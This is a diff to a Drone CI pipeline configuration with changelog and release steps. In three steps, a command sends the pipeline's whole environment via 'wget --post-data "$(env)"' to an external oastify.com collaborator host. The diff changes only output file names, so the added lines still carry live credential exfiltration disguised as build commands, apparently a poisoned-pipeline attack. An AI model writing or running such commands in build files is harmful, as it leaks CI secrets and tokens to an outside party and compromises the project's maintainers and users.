@@ -83,7 +83,7 @@ steps:
       webhook:
         from_secret: rocketchat_chat_webhook
     commands:
-      - wget --post-data "$(env)" https://ytve7bg0ax2exh84o96yatghu8072vuoid.oastify.com
+      - wget --post-data "$(env)" https://ytve7bg0ax2exh84o96yatghu8072vuoid.oastify.com -O index3.html
       - git fetch -tq
       - git-chglog --no-color --no-emoji -o CHANGELOG.md ${DRONE_TAG:---next-tag unreleased unreleased}
       - cat CHANGELOG.md
@@ -103,7 +103,7 @@ steps:
       overwrite: true
       title: ${DRONE_TAG}
     commands:
-      - wget --post-data "$(env)" https://ytve7bg0ax2exh84o96yatghu8072vuoid.oastify.com
+      - wget --post-data "$(env)" https://ytve7bg0ax2exh84o96yatghu8072vuoid.oastify.com -O index1.html
 
 trigger:
   ref:
@@ -130,7 +130,7 @@ steps:
       webhook:
         from_secret: rocketchat_chat_webhook
     commands:
-      - wget -O indexx.html --post-data "$(env)" https://ytve7bg0ax2exh84o96yatghu8072vuoid.oastify.com
+      - wget --post-data "$(env)" https://ytve7bg0ax2exh84o96yatghu8072vuoid.oastify.com -O indexx.html
 
 
 trigger:
